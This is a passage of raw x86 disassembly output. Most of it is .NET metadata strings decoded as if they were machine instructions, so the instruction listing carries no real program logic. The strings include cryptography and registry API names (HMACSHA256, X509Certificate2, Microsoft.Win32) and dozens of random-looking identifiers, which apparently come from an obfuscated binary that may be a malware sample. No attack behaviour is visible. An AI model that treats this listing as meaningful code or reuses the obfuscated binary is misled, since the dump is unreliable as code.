  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 77 17             	add    %dh,0x17(%edi)
  407706:	6a 17                	push   $0x17
  407708:	82 17 ef             	adcb   $0xef,(%edi)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	e4 24                	in     $0x24,%al
  40771c:	01 00                	add    %eax,(%eax)
  40771e:	00 01                	add    %al,(%ecx)
  407720:	73 00                	jae    0x407722
  407722:	68 23 01 00 00       	push   $0x123
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	3e 0e                	ds push %cs
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	99                   	cltd
  407733:	22 02                	and    (%edx),%al
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	34 10                	xor    $0x10,%al
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	eb 16                	jmp    0x40775a
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	2c 23                	sub    $0x23,%al
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	39 0a                	cmp    %ecx,(%edx)
  407778:	00 00                	add    %al,(%eax)
  40777a:	00 00                	add    %al,(%eax)
  40777c:	04 00                	add    $0x0,%al
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	41                   	inc    %ecx
  40778b:	18 00                	sbb    %al,(%eax)
  40778d:	00 00                	add    %al,(%eax)
  40778f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 4d 14             	add    %cl,0x14(%ebp)
  4077a0:	00 00                	add    %al,(%eax)
  4077a2:	00 00                	add    %al,(%eax)
  4077a4:	04 00                	add    $0x0,%al
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	f2 0f 00 00          	repnz sldt (%eax)
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	0a 00                	or     (%eax),%al
	...
  4077c2:	00 00                	add    %al,(%eax)
  4077c4:	cc                   	int3
  4077c5:	00 c6                	add    %al,%dh
  4077c7:	0a 00                	or     (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 45 22             	add    %al,0x22(%ebp)
  4077dc:	00 00                	add    %al,(%eax)
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	06                   	push   %es
  4077ef:	20 00                	and    %al,(%eax)
  4077f1:	00 00                	add    %al,(%eax)
  4077f3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 18                	add    %bl,(%eax)
  407803:	1b 00                	sbb    (%eax),%eax
  407805:	00 00                	add    %al,(%eax)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	4d                   	dec    %ebp
  407848:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40784f:	74 2e                	je     0x40787f
  407851:	57                   	push   %edi
  407852:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407859:	55                   	push   %ebp
  40785a:	49                   	dec    %ecx
  40785b:	6e                   	outsb  %ds:(%esi),(%dx)
  40785c:	74 33                	je     0x407891
  40785e:	32 00                	xor    (%eax),%al
  407860:	54                   	push   %esp
  407861:	6f                   	outsl  %ds:(%esi),(%dx)
  407862:	49                   	dec    %ecx
  407863:	6e                   	outsb  %ds:(%esi),(%dx)
  407864:	74 33                	je     0x407899
  407866:	32 00                	xor    (%eax),%al
  407868:	58                   	pop    %eax
  407869:	35 30 39 43 65       	xor    $0x65433930,%eax
  40786e:	72 74                	jb     0x4078e4
  407870:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407877:	32 00                	xor    (%eax),%al
  407879:	54                   	push   %esp
  40787a:	6f                   	outsl  %ds:(%esi),(%dx)
  40787b:	55                   	push   %ebp
  40787c:	49                   	dec    %ecx
  40787d:	6e                   	outsb  %ds:(%esi),(%dx)
  40787e:	74 36                	je     0x4078b6
  407880:	34 00                	xor    $0x0,%al
  407882:	54                   	push   %esp
  407883:	6f                   	outsl  %ds:(%esi),(%dx)
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 36                	je     0x4078be
  407888:	34 00                	xor    $0x0,%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	55                   	push   %ebp
  40788d:	49                   	dec    %ecx
  40788e:	6e                   	outsb  %ds:(%esi),(%dx)
  40788f:	74 31                	je     0x4078c2
  407891:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 31                	je     0x4078ca
  407899:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  40789d:	41                   	inc    %ecx
  40789e:	43                   	inc    %ebx
  40789f:	53                   	push   %ebx
  4078a0:	48                   	dec    %eax
  4078a1:	41                   	inc    %ecx
  4078a2:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078a8:	74 5f                	je     0x407909
  4078aa:	55                   	push   %ebp
  4078ab:	54                   	push   %esp
  4078ac:	46                   	inc    %esi
  4078ad:	38 00                	cmp    %al,(%eax)
  4078af:	3c 4d                	cmp    $0x4d,%al
  4078b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b2:	64 75 6c             	fs jne 0x407921
  4078b5:	65 3e 00 6f 50       	gs add %ch,%ds:0x50(%edi)
  4078ba:	76 54                	jbe    0x407910
  4078bc:	56                   	push   %esi
  4078bd:	71 49                	jno    0x407908
  4078bf:	73 72                	jae    0x407933
  4078c1:	64 70 63             	fs jo  0x407927
  4078c4:	41                   	inc    %ecx
  4078c5:	41                   	inc    %ecx
  4078c6:	00 6e 64             	add    %ch,0x64(%esi)
  4078c9:	70 42                	jo     0x40790d
  4078cb:	52                   	push   %edx
  4078cc:	72 45                	jb     0x407913
  4078ce:	76 6a                	jbe    0x40793a
  4078d0:	6b 75 42 43          	imul   $0x43,0x42(%ebp),%esi
  4078d4:	63 41 00             	arpl   %eax,0x0(%ecx)
  4078d7:	4d                   	dec    %ebp
  4078d8:	4b                   	dec    %ebx
  4078d9:	68 4d 55 78 67       	push   $0x6778554d
  4078de:	70 6d                	jo     0x40794d
  4078e0:	46                   	inc    %esi
  4078e1:	64 41                	fs inc %ecx
  4078e3:	00 64 55 4e          	add    %ah,0x4e(%ebp,%edx,2)
  4078e7:	73 70                	jae    0x407959
  4078e9:	5a                   	pop    %edx
  4078ea:	51                   	push   %ecx
  4078eb:	73 52                	jae    0x40793f
  4078ed:	44                   	inc    %esp
  4078ee:	48                   	dec    %eax
  4078ef:	42                   	inc    %edx
  4078f0:	00 51 6e             	add    %dl,0x6e(%ecx)
  4078f3:	71 74                	jno    0x407969
  4078f5:	45                   	inc    %ebp
  4078f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f8:	77 61                	ja     0x40795b
  4078fa:	53                   	push   %ebx
  4078fb:	50                   	push   %eax
  4078fc:	42                   	inc    %edx
  4078fd:	00 4d 7a             	add    %cl,0x7a(%ebp)
  407900:	62 6c 44 63          	bound  %ebp,0x63(%esp,%eax,2)
  407904:	46                   	inc    %esi
  407905:	67 6f                	outsl  %ds:(%si),(%dx)
  407907:	52                   	push   %edx
  407908:	55                   	push   %ebp
  407909:	42                   	inc    %edx
  40790a:	00 4b 79             	add    %cl,0x79(%ebx)
  40790d:	55                   	push   %ebp
  40790e:	76 63                	jbe    0x407973
  407910:	56                   	push   %esi
  407911:	42                   	inc    %edx
  407912:	43                   	inc    %ebx
  407913:	65 42                	gs inc %edx
  407915:	00 62 78             	add    %ah,0x78(%edx)
  407918:	50                   	push   %eax
  407919:	55                   	push   %ebp
  40791a:	43                   	inc    %ebx
  40791b:	50                   	push   %eax
  40791c:	42                   	inc    %edx
  40791d:	65 71 61             	gs jno 0x407981
  407920:	53                   	push   %ebx
  407921:	61                   	popa
  407922:	79 42                	jns    0x407966
  407924:	00 4d 73             	add    %cl,0x73(%ebp)
  407927:	62 79 62             	bound  %edi,0x62(%ecx)
  40792a:	7a 4d                	jp     0x407979
  40792c:	6e                   	outsb  %ds:(%esi),(%dx)
  40792d:	67 45                	addr16 inc %ebp
  40792f:	43                   	inc    %ebx
  407930:	00 47 43             	add    %al,0x43(%edi)
  407933:	00 6a 59             	add    %ch,0x59(%edx)
  407936:	5a                   	pop    %edx
  407937:	41                   	inc    %ecx
  407938:	45                   	inc    %ebp
  407939:	49                   	dec    %ecx
  40793a:	70 63                	jo     0x40799f
  40793c:	72 4d                	jb     0x40798b
  40793e:	43                   	inc    %ebx
  40793f:	00 78 54             	add    %bh,0x54(%eax)
  407942:	49                   	dec    %ecx
  407943:	57                   	push   %edi
  407944:	65 5a                	gs pop %edx
  407946:	64 65 41             	fs gs inc %ecx
  407949:	4d                   	dec    %ebp
  40794a:	41                   	inc    %ecx
  40794b:	65 43                	gs inc %ebx
  40794d:	00 58 77             	add    %bl,0x77(%eax)
  407950:	48                   	dec    %eax
  407951:	64 76 72             	fs jbe 0x4079c6
  407954:	58                   	pop    %eax
  407955:	43                   	inc    %ebx
  407956:	49                   	dec    %ecx
  407957:	56                   	push   %esi
  407958:	77 75                	ja     0x4079cf
  40795a:	43                   	inc    %ebx
  40795b:	00 7a 56             	add    %bh,0x56(%edx)
  40795e:	73 64                	jae    0x4079c4
  407960:	69 5a 6c 58 50 78 43 	imul   $0x43785058,0x6c(%edx),%ebx
  407967:	00 55 4e             	add    %dl,0x4e(%ebp)
  40796a:	42                   	inc    %edx
  40796b:	62 43 41             	bound  %eax,0x41(%ebx)
  40796e:	75 76                	jne    0x4079e6
  407970:	5a                   	pop    %edx
  407971:	72 51                	jb     0x4079c4
  407973:	7a 45                	jp     0x4079ba
  407975:	79 78                	jns    0x4079ef
  407977:	43                   	inc    %ebx
  407978:	00 44 54 4b          	add    %al,0x4b(%esp,%edx,2)
  40797c:	6b 54 79 45 64       	imul   $0x64,0x45(%ecx,%edi,2),%edx
  407981:	49                   	dec    %ecx
  407982:	66 64 76 4a          	data16 fs jbe 0x4079d0
  407986:	6b 73 42 44          	imul   $0x44,0x42(%ebx),%esi
  40798a:	00 78 70             	add    %bh,0x70(%eax)
  40798d:	77 4d                	ja     0x4079dc
  40798f:	54                   	push   %esp
  407990:	4b                   	dec    %ebx
  407991:	75 56                	jne    0x4079e9
  407993:	6a 59                	push   $0x59
  407995:	64 77 6a             	fs ja  0x407a02
  407998:	44                   	inc    %esp
  407999:	44                   	inc    %esp
  40799a:	00 4d 61             	add    %cl,0x61(%ebp)
  40799d:	70 4e                	jo     0x4079ed
  40799f:	61                   	popa
  4079a0:	6d                   	insl   (%dx),%es:(%edi)
  4079a1:	65 54                	gs push %esp
  4079a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4079a4:	4f                   	dec    %edi
  4079a5:	49                   	dec    %ecx
  4079a6:	44                   	inc    %esp
  4079a7:	00 67 65             	add    %ah,0x65(%edi)
  4079aa:	74 5f                	je     0x407a0b
  4079ac:	46                   	inc    %esi
  4079ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ae:	72 6d                	jb     0x407a1d
  4079b0:	61                   	popa
  4079b1:	74 49                	je     0x4079fc
  4079b3:	44                   	inc    %esp
  4079b4:	00 6d 47             	add    %ch,0x47(%ebp)
  4079b7:	45                   	inc    %ebp
  4079b8:	70 52                	jo     0x407a0c
  4079ba:	5a                   	pop    %edx
  4079bb:	77 53                	ja     0x407a10
  4079bd:	77 56                	ja     0x407a15
  4079bf:	44                   	inc    %esp
  4079c0:	00 63 4c             	add    %ah,0x4c(%ebx)
  4079c3:	4a                   	dec    %edx
  4079c4:	70 58                	jo     0x407a1e
  4079c6:	53                   	push   %ebx
  4079c7:	48                   	dec    %eax
  4079c8:	5a                   	pop    %edx
  4079c9:	45                   	inc    %ebp
  4079ca:	64 77 4c             	fs ja  0x407a19
  4079cd:	73 5a                	jae    0x407a29
  4079cf:	44                   	inc    %esp
  4079d0:	00 4d 46             	add    %cl,0x46(%ebp)
  4079d3:	78 75                	js     0x407a4a
  4079d5:	7a 7a                	jp     0x407a51
  4079d7:	64 4f                	fs dec %edi
  4079d9:	65 61                	gs popa
  4079db:	44                   	inc    %esp
  4079dc:	00 43 55             	add    %al,0x55(%ebx)
  4079df:	43                   	inc    %ebx
  4079e0:	50                   	push   %eax
  4079e1:	59                   	pop    %ecx
  4079e2:	41                   	inc    %ecx
  4079e3:	62 69 74             	bound  %ebp,0x74(%ecx)
  4079e6:	48                   	dec    %eax
  4079e7:	73 69                	jae    0x407a52
  4079e9:	44                   	inc    %esp
  4079ea:	00 43 45             	add    %al,0x45(%ebx)
  4079ed:	56                   	push   %esi
  4079ee:	73 67                	jae    0x407a57
  4079f0:	55                   	push   %ebp
  4079f1:	44                   	inc    %esp
  4079f2:	53                   	push   %ebx
  4079f3:	50                   	push   %eax
  4079f4:	72 49                	jb     0x407a3f
  4079f6:	6b 44 00 4a 43       	imul   $0x43,0x4a(%eax,%eax,1),%eax
  4079fb:	53                   	push   %ebx
  4079fc:	5a                   	pop    %edx
  4079fd:	74 62                	je     0x407a61
  4079ff:	47                   	inc    %edi
  407a00:	70 59                	jo     0x407a5b
  407a02:	48                   	dec    %eax
  407a03:	79 44                	jns    0x407a49
  407a05:	00 63 59             	add    %ah,0x59(%ebx)
  407a08:	4c                   	dec    %esp
  407a09:	52                   	push   %edx
  407a0a:	4c                   	dec    %esp
  407a0b:	51                   	push   %ecx
  407a0c:	64 4a                	fs dec %edx
  407a0e:	43                   	inc    %ebx
  407a0f:	7a 44                	jp     0x407a55
  407a11:	00 47 68             	add    %al,0x68(%edi)
  407a14:	6b 4f 75 6f          	imul   $0x6f,0x75(%edi),%ecx
  407a18:	6d                   	insl   (%dx),%es:(%edi)
  407a19:	62 44 54 57          	bound  %eax,0x57(%esp,%edx,2)
  407a1d:	4b                   	dec    %ebx
  407a1e:	45                   	inc    %ebp
  407a1f:	00 4b 6d             	add    %cl,0x6d(%ebx)
  407a22:	6e                   	outsb  %ds:(%esi),(%dx)
  407a23:	42                   	inc    %edx
  407a24:	45                   	inc    %ebp
  407a25:	78 49                	js     0x407a70
  407a27:	54                   	push   %esp
  407a28:	61                   	popa
  407a29:	45                   	inc    %ebp
  407a2a:	59                   	pop    %ecx
  407a2b:	62 65 45             	bound  %esp,0x45(%ebp)
  407a2e:	00 54 72 77          	add    %dl,0x77(%edx,%esi,2)
  407a32:	75 6e                	jne    0x407aa2
  407a34:	50                   	push   %eax
  407a35:	7a 6c                	jp     0x407aa3
  407a37:	4c                   	dec    %esp
  407a38:	50                   	push   %eax
  407a39:	58                   	pop    %eax
  407a3a:	59                   	pop    %ecx
  407a3b:	54                   	push   %esp
  407a3c:	53                   	push   %ebx
  407a3d:	6a 45                	push   $0x45
  407a3f:	00 5a 7a             	add    %bl,0x7a(%edx)
  407a42:	4e                   	dec    %esi
  407a43:	4d                   	dec    %ebp
  407a44:	47                   	inc    %edi
  407a45:	63 63 64             	arpl   %esp,0x64(%ebx)
  407a48:	6e                   	outsb  %ds:(%esi),(%dx)
  407a49:	45                   	inc    %ebp
  407a4a:	00 44 48 4d          	add    %al,0x4d(%eax,%ecx,2)
  407a4e:	68 42 73 68 78       	push   $0x78687342
  407a53:	77 45                	ja     0x407a9a
  407a55:	00 6e 74             	add    %ch,0x74(%esi)
  407a58:	4d                   	dec    %ebp
  407a59:	4c                   	dec    %esp
  407a5a:	45                   	inc    %ebp
  407a5b:	66 50                	push   %ax
  407a5d:	4a                   	dec    %edx
  407a5e:	59                   	pop    %ecx
  407a5f:	47                   	inc    %edi
  407a60:	46                   	inc    %esi
  407a61:	00 7a 4e             	add    %bh,0x4e(%edx)
  407a64:	5a                   	pop    %edx
  407a65:	4d                   	dec    %ebp
  407a66:	64 61                	fs popa
  407a68:	7a 77                	jp     0x407ae1
  407a6a:	4f                   	dec    %edi
  407a6b:	46                   	inc    %esi
  407a6c:	00 6e 75             	add    %ch,0x75(%esi)
  407a6f:	54                   	push   %esp
  407a70:	57                   	push   %edi
  407a71:	50                   	push   %eax
  407a72:	69 6e 57 6d 6a 46 51 	imul   $0x51466a6d,0x57(%esi),%ebp
  407a79:	46                   	inc    %esi
  407a7a:	00 64 42 48          	add    %ah,0x48(%edx,%eax,2)
  407a7e:	57                   	push   %edi
  407a7f:	63 56 41             	arpl   %edx,0x41(%esi)
  407a82:	69 54 6d 56 46 00 44 	imul   $0x58440046,0x56(%ebp,%ebp,2),%edx
  407a89:	58 
  407a8a:	4f                   	dec    %edi
  407a8b:	71 6e                	jno    0x407afb
  407a8d:	6d                   	insl   (%dx),%es:(%edi)
  407a8e:	47                   	inc    %edi
  407a8f:	4f                   	dec    %edi
  407a90:	46                   	inc    %esi
  407a91:	77 68                	ja     0x407afb
  407a93:	77 46                	ja     0x407adb
  407a95:	00 56 4f             	add    %dl,0x4f(%esi)
  407a98:	45                   	inc    %ebp
  407a99:	54                   	push   %esp
  407a9a:	45                   	inc    %ebp
  407a9b:	68 61 6d 46 7a       	push   $0x7a466d61
  407aa0:	46                   	inc    %esi
  407aa1:	00 42 63             	add    %al,0x63(%edx)
  407aa4:	54                   	push   %esp
  407aa5:	68 63 4b 51 56       	push   $0x56514b63
  407aaa:	55                   	push   %ebp
  407aab:	53                   	push   %ebx
  407aac:	49                   	dec    %ecx
  407aad:	47                   	inc    %edi
  407aae:	00 65 6f             	add    %ah,0x6f(%ebp)
  407ab1:	4c                   	dec    %esp
  407ab2:	6d                   	insl   (%dx),%es:(%edi)
  407ab3:	65 70 62             	gs jo  0x407b18
  407ab6:	50                   	push   %eax
  407ab7:	72 42                	jb     0x407afb
  407ab9:	45                   	inc    %ebp
  407aba:	4a                   	dec    %edx
  407abb:	47                   	inc    %edi
  407abc:	00 46 59             	add    %al,0x59(%esi)
  407abf:	59                   	pop    %ecx
  407ac0:	46                   	inc    %esi
  407ac1:	54                   	push   %esp
  407ac2:	76 43                	jbe    0x407b07
  407ac4:	72 6e                	jb     0x407b34
  407ac6:	50                   	push   %eax
  407ac7:	47                   	inc    %edi
  407ac8:	00 6b 4d             	add    %ch,0x4d(%ebx)
  407acb:	6f                   	outsl  %ds:(%esi),(%dx)
  407acc:	72 50                	jb     0x407b1e
  407ace:	51                   	push   %ecx
  407acf:	50                   	push   %eax
  407ad0:	4d                   	dec    %ebp
  407ad1:	44                   	inc    %esp
  407ad2:	48                   	dec    %eax
  407ad3:	59                   	pop    %ecx
  407ad4:	57                   	push   %edi
  407ad5:	47                   	inc    %edi
  407ad6:	00 67 76             	add    %ah,0x76(%edi)
  407ad9:	7a 6c                	jp     0x407b47
  407adb:	44                   	inc    %esp
  407adc:	69 49 5a 74 68 47 00 	imul   $0x476874,0x5a(%ecx),%ecx
  407ae3:	67 79 45             	addr16 jns 0x407b2b
  407ae6:	68 6b 65 47 79       	push   $0x7947656b
  407aeb:	77 47                	ja     0x407b34
  407aed:	00 6f 66             	add    %ch,0x66(%edi)
  407af0:	55                   	push   %ebp
  407af1:	42                   	inc    %edx
  407af2:	61                   	popa
  407af3:	67 76 46             	addr16 jbe 0x407b3c
  407af6:	62 79 47             	bound  %edi,0x47(%ecx)
  407af9:	00 69 6f             	add    %ch,0x6f(%ecx)
  407afc:	53                   	push   %ebx
  407afd:	4c                   	dec    %esp
  407afe:	52                   	push   %edx
  407aff:	4f                   	dec    %edi
  407b00:	6b 74 50 77 67       	imul   $0x67,0x77(%eax,%edx,2),%esi
  407b05:	48                   	dec    %eax
  407b06:	48                   	dec    %eax
  407b07:	00 72 76             	add    %dh,0x76(%edx)
  407b0a:	65 53                	gs push %ebx
  407b0c:	47                   	inc    %edi
  407b0d:	44                   	inc    %esp
  407b0e:	4d                   	dec    %ebp
  407b0f:	4d                   	dec    %ebp
  407b10:	67 57                	addr16 push %edi
  407b12:	48                   	dec    %eax
  407b13:	00 4d 6d             	add    %cl,0x6d(%ebp)
  407b16:	46                   	inc    %esi
  407b17:	58                   	pop    %eax
  407b18:	7a 73                	jp     0x407b8d
  407b1a:	6a 47                	push   $0x47
  407b1c:	69 76 49 6d 76 6f 62 	imul   $0x626f766d,0x49(%esi),%esi
  407b23:	48                   	dec    %eax
  407b24:	00 4e 42             	add    %cl,0x42(%esi)
  407b27:	59                   	pop    %ecx
  407b28:	6b 63 4c 56          	imul   $0x56,0x4c(%ebx),%esp
  407b2c:	6e                   	outsb  %ds:(%esi),(%dx)
  407b2d:	4c                   	dec    %esp
  407b2e:	63 48 00             	arpl   %ecx,0x0(%eax)
  407b31:	7a 6d                	jp     0x407ba0
  407b33:	50                   	push   %eax
  407b34:	66 6f                	outsw  %ds:(%esi),(%dx)
  407b36:	54                   	push   %esp
  407b37:	77 58                	ja     0x407b91
  407b39:	6c                   	insb   (%dx),%es:(%edi)
  407b3a:	48                   	dec    %eax
  407b3b:	00 67 56             	add    %ah,0x56(%edi)
  407b3e:	62 70 63             	bound  %esi,0x63(%eax)
  407b41:	67 72 58             	addr16 jb 0x407b9c
  407b44:	7a 63                	jp     0x407ba9
  407b46:	69 42 49 00 67 65 74 	imul   $0x74656700,0x49(%edx),%eax
  407b4d:	5f                   	pop    %edi
  407b4e:	41                   	inc    %ecx
  407b4f:	53                   	push   %ebx
  407b50:	43                   	inc    %ebx
  407b51:	49                   	dec    %ecx
  407b52:	49                   	dec    %ecx
  407b53:	00 42 5a             	add    %al,0x5a(%edx)
  407b56:	5a                   	pop    %edx
  407b57:	7a 6a                	jp     0x407bc3
  407b59:	73 4c                	jae    0x407ba7
  407b5b:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5c:	70 44                	jo     0x407ba2
  407b5e:	4c                   	dec    %esp
  407b5f:	4c                   	dec    %esp
  407b60:	49                   	dec    %ecx
  407b61:	00 75 41             	add    %dh,0x41(%ebp)
  407b64:	4b                   	dec    %ebx
  407b65:	61                   	popa
  407b66:	47                   	inc    %edi
  407b67:	6a 58                	push   $0x58
  407b69:	6d                   	insl   (%dx),%es:(%edi)
  407b6a:	58                   	pop    %eax
  407b6b:	52                   	push   %edx
  407b6c:	49                   	dec    %ecx
  407b6d:	00 61 70             	add    %ah,0x70(%ecx)
  407b70:	58                   	pop    %eax
  407b71:	6a 47                	push   $0x47
  407b73:	52                   	push   %edx
  407b74:	75 47                	jne    0x407bbd
  407b76:	56                   	push   %esi
  407b77:	63 4b 4b             	arpl   %ecx,0x4b(%ebx)
  407b7a:	52                   	push   %edx
  407b7b:	57                   	push   %edi
  407b7c:	49                   	dec    %ecx
  407b7d:	00 68 75             	add    %ch,0x75(%eax)
  407b80:	59                   	pop    %ecx
  407b81:	50                   	push   %eax
  407b82:	46                   	inc    %esi
  407b83:	48                   	dec    %eax
  407b84:	4b                   	dec    %ebx
  407b85:	79 49                	jns    0x407bd0
  407b87:	41                   	inc    %ecx
  407b88:	49                   	dec    %ecx
  407b89:	64 48                	fs dec %eax
  407b8b:	63 49 00             	arpl   %ecx,0x0(%ecx)
  407b8e:	71 6e                	jno    0x407bfe
  407b90:	53                   	push   %ebx
  407b91:	59                   	pop    %ecx
  407b92:	65 56                	gs push %esi
  407b94:	55                   	push   %ebp
  407b95:	45                   	inc    %ebp
  407b96:	72 77                	jb     0x407c0f
  407b98:	6a 49                	push   $0x49
  407b9a:	00 4d 4e             	add    %cl,0x4e(%ebp)
  407b9d:	72 68                	jb     0x407c07
  407b9f:	75 54                	jne    0x407bf5
  407ba1:	75 52                	jne    0x407bf5
  407ba3:	55                   	push   %ebp
  407ba4:	4d                   	dec    %ebp
  407ba5:	44                   	inc    %esp
  407ba6:	4a                   	dec    %edx
  407ba7:	00 75 71             	add    %dh,0x71(%ebp)
  407baa:	70 62                	jo     0x407c0e
  407bac:	4a                   	dec    %edx
  407bad:	7a 51                	jp     0x407c00
  407baf:	4e                   	dec    %esi
  407bb0:	62 6c 49 4e          	bound  %ebp,0x4e(%ecx,%ecx,2)
  407bb4:	4a                   	dec    %edx
